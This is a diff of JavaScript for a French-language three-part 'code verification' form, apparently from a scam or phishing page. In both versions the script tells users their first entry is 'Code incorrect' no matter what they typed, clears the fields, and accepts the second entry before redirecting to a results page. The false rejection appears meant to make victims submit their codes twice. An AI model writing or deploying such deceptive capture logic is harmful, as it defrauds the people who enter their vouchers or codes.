@@ -90,64 +90,75 @@ if (!verificationForm) {
             }
         )
 
-        .then(function () {
+       .then(function () {
 
-            tentatives++;
+    tentatives++;
 
-            localStorage.setItem("tentatives", tentatives);
+    localStorage.setItem("tentatives", tentatives);
 
-            // =========================
-            // Première tentative
-            // =========================
+    console.log("Tentative numéro :", tentatives);
 
-            if (tentatives === 1) {
 
-                result.innerHTML = "✅ Votre demande est en cours de traitement.";
-                result.className = "success";
+    // =========================
+    // Première tentative
+    // =========================
 
-                setTimeout(function () {
+    if (tentatives === 1) {
 
-                    result.innerHTML = "❌ Code incorrect. Veuillez saisir un code correct.";
-                    result.className = "error";
+        result.innerHTML = "✅ Votre demande est en cours de traitement.";
+        result.className = "success";
 
-                    part1.value = "";
-                    part2.value = "";
-                    part3.value = "";
 
-                    grecaptcha.reset();
+        setTimeout(function () {
 
-                    part1.focus();
+            result.innerHTML = "❌ Code incorrect. Veuillez saisir un code correct.";
+            result.className = "error";
 
-                }, 2000);
+            part1.value = "";
+            part2.value = "";
+            part3.value = "";
 
-                return;
+            grecaptcha.reset();
 
-            }
+            part1.focus();
 
-            // =========================
-            // Deuxième tentative
-            // =========================
 
-            if (tentatives === 2) {
+        }, 2000);
 
-                localStorage.setItem("codePromo", code);
 
-                localStorage.removeItem("tentatives");
+        return;
 
-                result.innerHTML = "✅ Vérification en cours...";
-                result.className = "success";
+    }
 
-                setTimeout(function () {
 
-                    window.location.href = "resultat.html";
 
-                }, 1500);
+    // =========================
+    // Deuxième tentative
+    // =========================
 
-                return;
+    if (tentatives >= 2) {
 
-            }
 
-        })
+        result.innerHTML = "✅ Vérification en cours...";
+        result.className = "success";
+
+
+        setTimeout(function () {
+
+            localStorage.removeItem("tentatives");
+
+            window.location.href = "resultat.html";
+
+
+        }, 1500);
+
+
+        return;
+
+    }
+
+
+})
 
         .catch(function (error) {
 
